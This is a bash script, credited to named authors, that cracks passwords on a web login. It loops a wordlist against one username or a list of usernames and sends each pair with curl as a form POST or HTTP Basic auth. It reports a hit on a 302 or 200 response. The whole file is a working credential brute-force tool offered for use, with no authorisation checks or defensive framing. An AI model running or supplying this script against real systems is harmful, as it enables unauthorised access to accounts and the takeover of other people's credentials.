#!/bin/bash
# Simple Form-Based or Basic-Authentication password cracker
# Script by Robert Ross(Root) && Netr1d3r
# Script updated Sept. 2024


if [ $# -ne 2 ]; then
    clear
    echo "Script name: $0"
    echo "Usage: $0 [wordlist] [target]"
    echo "Number of args supplied: $#"
else
    echo "Select authentication type:"
    echo "1. Form-based authentication"
    echo "2. Basic authentication"
    read -p "Enter your choice (1 or 2): " auth_type

    if [ "$auth_type" -eq 1 ]; then
        read -p "Do you want to test for multiple users? (y/n): " multi_user
        if [ "$multi_user" == "y" ]; then
            read -p "Enter the path to the usernames file: " userfile
        else
            read -p "Enter your username: " username
        fi

        for line in $(cat $1); do
            if [ "$multi_user" == "y" ]; then
                for user in $(cat $userfile); do
                    echo "Trying $user:$line for login"
                    response=$(curl --silent --write-out "%{http_code}" --output /dev/null --data "username=$user&password=$line" $2)
                    if [ "$response" -eq 302 ]; then
                        echo "Login successful for $user"
                        echo "Username: $user | Password: $line"
                        break 2
                    else
                        echo "Failed for $user:$line"
                    fi
                done
            else
                echo "Trying $username:$line for login"
                response=$(curl --silent --write-out "%{http_code}" --output /dev/null --data "username=$username&password=$line" $2)
                if [ "$response" -eq 302 ]; then
                    echo "Login successful"
                    echo "Password: $line"
                    break
                else
                    echo "Failed for $username:$line"
                fi
            fi
        done

    elif [ "$auth_type" -eq 2 ]; then
        read -p "Do you want to test for multiple users? (y/n): " multi_user
        if [ "$multi_user" == "y" ]; then
            read -p "Enter the path to the usernames file: " userfile
        else
            read -p "Enter your username: " username
        fi

        for line in $(cat $1); do
            if [ "$multi_user" == "y" ]; then
                for user in $(cat $userfile); do
                    echo "Trying $user:$line for login"
                    response=$(curl --silent --write-out "%{http_code}" --output /dev/null -u "$user:$line" $2)
                    if [ "$response" -eq 200 ]; then
                        echo "Login successful for $user"
                        echo "Username: $user | Password: $line"
                        break 2
                    else
                        echo "Failed for $user:$line"
                    fi
                done
            else
                echo "Trying $username:$line for login"
                response=$(curl --silent --write-out "%{http_code}" --output /dev/null -u "$username:$line" $2)
                if [ "$response" -eq 200 ]; then
                    echo "Login successful"
                    echo "Password: $line"
                    break
                else
                    echo "Failed for $username:$line"
                fi
            fi
        done
    else
        echo "Invalid choice"
    fi
fi
